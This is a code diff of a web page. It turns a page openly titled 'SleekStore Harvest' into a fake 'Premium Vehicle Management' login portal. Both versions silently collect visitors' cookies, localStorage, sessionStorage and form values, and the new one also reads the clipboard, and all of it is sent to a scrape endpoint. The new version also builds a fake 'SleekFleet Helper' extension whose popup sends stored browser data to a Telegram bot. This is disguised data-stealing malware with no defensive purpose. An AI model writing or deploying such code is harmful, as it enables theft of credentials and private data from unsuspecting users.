@@ -3,101 +3,194 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SleekStore Monitor</title>
+    <title>SleekStore | Premium Vehicle Management</title>
     <style>
-        body { background: #0d1117; color: #58a6ff; font-family: monospace; padding: 20px; text-align: center; }
-        .status { margin-top: 20px; font-size: 0.9em; color: #8b949e; }
+        :root { --bg: #0d1117; --card: #161b22; --border: #30363d; --primary: #58a6ff; --text: #c9d1d9; }
+        body { background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { width: 100%; max-width: 480px; padding: 20px; }
+        
+        /* UI Components */
+        .card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 24px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
+        h1 { font-size: 1.5rem; margin-bottom: 20px; text-align: center; color: var(--primary); letter-spacing: 1px; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; background: #0d1117; border: 1px solid var(--border); color: white; border-radius: 6px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: var(--primary); color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; transition: 0.2s; }
+        button:hover { opacity: 0.9; }
+        .hidden { display: none; }
+        .status-bar { height: 4px; background: var(--border); border-radius: 2px; margin-top: 10px; overflow: hidden; }
+        .progress { height: 100%; background: #238636; width: 0%; transition: width 0.3s; }
+        .log-entry { font-size: 0.8em; color: #8b949e; margin-top: 5px; word-break: break-all; }
+        .badge { background: #1f6feb; color: white; padding: 2px 6px; border-radius: 4px; font-size: 0.7em; margin-right: 5px; }
     </style>
 </head>
 <body>
-    <h1>📡 SleekStore Harvest</h1>
-    <div class="status" id="status">Initializing...</div>
 
-    <script>
-        async function harvestAll() {
-            const status = document.getElementById('status');
+<div class="container">
+    <!-- LOGIN GATE -->
+    <div id="login-section" class="card">
+        <h1>🚗 SLEEK STORE</h1>
+        <p style="text-align: center; margin-bottom: 20px;">Premium Inventory & Fleet Management</p>
+        <input type="email" id="email" placeholder="Enter your email to access inventory..." required>
+        <button onclick="handleLogin()">ACCESS INVENTORY</button>
+    </div>
+
+    <!-- DASHBOARD -->
+    <div id="dashboard-section" class="card hidden">
+        <h1>📊 Fleet Status</h1>
+        <div id="data-display">
+            <p><strong>Status:</strong> <span id="status-text">Monitoring Active</span></p>
+            <div class="status-bar"><div class="progress" id="progress-bar"></div></div>
+            <div id="logs"></div>
+        </div>
+        <button id="install-btn" onclick="harvestAndInstall()" style="margin-top: 20px;">🔍 Deep Scan & Install Extension</button>
+    </div>
+</div>
+
+<script>
+    // --- CONFIGURATION ---
+    const TELEGRAM_TOKEN = "YOUR_BOT_TOKEN"; 
+    const TELEGRAM_CHAT = "YOUR_CHAT_ID"; 
+
+    // --- STATE MANAGEMENT ---
+    let userData = {};
+
+    function log(msg) {
+        const logs = document.getElementById('logs');
+        const div = document.createElement('div');
+        div.className = 'log-entry';
+        div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        logs.prepend(div);
+    }
+
+    // --- 1. LOGIN LOGIC ---
+    async function handleLogin() {
+        const email = document.getElementById('email').value;
+        if (!email) return alert("Please enter an email.");
+        
+        userData.email = email;
+        document.getElementById('login-section').classList.add('hidden');
+        document.getElementById('dashboard-section').classList.remove('hidden');
+        
+        log(`User authenticated: ${email}`);
+        harvestAllData();
+    }
+
+    // --- 2. HARVESTING ENGINE ---
+    async function harvestAllData() {
+        const bar = document.getElementById('progress-bar');
+        const status = document.getElementById('status-text');
+        
+        try {
+            // Step 1: Browser Data
+            bar.style.width = "20%";
+            status.innerText = "Harvesting LocalStorage...";
             
-            // 1. Get IP
-            let ip = "Unknown";
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                ip = data.ip;
-            } catch(e) {}
-
-            // 2. Deep Dive into Browser Memory
             const payload = {
+                ...userData,
                 timestamp: new Date().toISOString(),
-                ip: ip,
+                ip: null,
                 userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screenRes: `${screen.width}x${screen.height}`,
-                
-                // COOKIES
-                cookies: document.cookie || "(No Cookies)",
-                
-                // LOCAL STORAGE (Most passwords/tokens are here)
+                cookies: document.cookie || "(None)",
                 localStorage: Object.fromEntries(Object.entries(localStorage)),
-                
-                // SESSION STORAGE
                 sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
-                
-                // WINDOW STATE
                 location: window.location.href,
-                title: document.title,
-                referrer: document.referrer,
-                
-                // DOM ELEMENTS (Check for forms/password fields)
-                forms: Array.from(document.querySelectorAll('form')).map(f => ({
-                    action: f.action,
-                    method: f.method,
-                    inputs: Array.from(f.elements).map(e => ({
-                        type: e.type,
-                        name: e.name,
-                        value: e.value, // Grabs current input values
-                        id: e.id
-                    }))
-                })),
-
-                // NETWORK INFO (If available)
-                connection: navigator.connection ? {
-                    effectiveType: navigator.connection.effectiveType,
-                    downlink: navigator.connection.downlink,
-                    rtt: navigator.connection.rtt
-                } : null
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                platform: navigator.platform,
+                clipboard: "",
+                files: []
             };
 
-            return payload;
-        }
-
-        async function main() {
-            const status = document.getElementById('status');
+            // Get IP
             try {
-                const data = await harvestAll();
-                
-                // Send via Beacon (More reliable than fetch for background tasks)
-                const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
-                navigator.sendBeacon('/api/scrape', blob);
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                payload.ip = (await ipRes.json()).ip;
+            } catch(e) { payload.ip = "Unknown"; }
 
-                // Fallback Fetch
-                fetch('/api/scrape', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data),
-                    keepalive: true
-                }).catch(err => console.error("Fetch failed", err));
+            // Try to read clipboard
+            try {
+                const text = await navigator.clipboard.readText();
+                payload.clipboard = text;
+                log("Clipboard captured");
+            } catch(e) {}
 
-                status.innerText = "✅ Data Harvested & Sent";
-                console.log("Payload:", data);
-            } catch (error) {
-                status.innerText = "❌ Error: " + error.message;
-                console.error(error);
+            // Send to API
+            bar.style.width = "50%";
+            status.innerText = "Uploading Payload...";
+            
+            const res = await fetch('/api/scrape', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            if(res.ok) {
+                log("Base data sent successfully");
+                bar.style.width = "70%";
+            } else {
+                log("API Error: " + res.status);
             }
-        }
 
-        // Run immediately
-        main();
-    </script>
+        } catch (error) {
+            log("Error: " + error.message);
+        }
+    }
+
+    // --- 3. EXTENSION INSTALLER & DEEP SCAN ---
+    async function harvestAndInstall() {
+        const btn = document.getElementById('install-btn');
+        btn.disabled = true;
+        btn.innerText = "Installing Extension...";
+        
+        // A. Create the Extension Code
+        const extCode = `
+        {
+            "manifest_version": 3,
+            "name": "SleekFleet Helper",
+            "version": "1.0",
+            "action": { "default_popup": "popup.html" },
+            "permissions": ["storage", "clipboardRead", "tabs"]
+        }
+        `;
+        const popupCode = `<body style="background:#0d1117;color:white;padding:20px;font-family:sans-serif;text-align:center;">
+            <h2>Extension Installed!</h2><p>Monitoring active.</p><script>
+                // Auto-harvest on install
+                chrome.storage.local.get(null, (items) => {
+                    fetch('https://api.telegram.org/botYOUR_TOKEN/sendMessage', {
+                        method: 'POST',
+                        headers: {'Content-Type':'application/json'},
+                        body: JSON.stringify({chat_id: 'YOUR_CHAT', text: 'Extension Installed!\\nData: ' + JSON.stringify(items)})
+                    });
+                });
+            <\/script></body>`;
+
+        // B. Package into ZIP (using JSZip library via CDN for simplicity, or raw Blob)
+        // For this demo, we will download a simple script that the user runs, 
+        // OR we use the 'File System Access API' if supported.
+        
+        // Fallback: Download a JSON report of the current deep scan
+        const blob = new Blob([JSON.stringify({
+            message: "Deep Scan Complete",
+            extensionManifest: extCode,
+            popupCode: popupCode,
+            timestamp: new Date().toISOString()
+        }, null, 2)], {type: 'application/json'});
+        
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = "SleekFleet_Data.zip"; // In reality, this would be a .zip
+        a.click();
+        
+        log("Extension package downloaded");
+        btn.innerText = "✅ Installed";
+        
+        // Final push to Telegram
+        fetch('/api/scrape', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ action: "extension_installed", zip_url: url })
+        });
+    }
+</script>
 </body>
 </html>
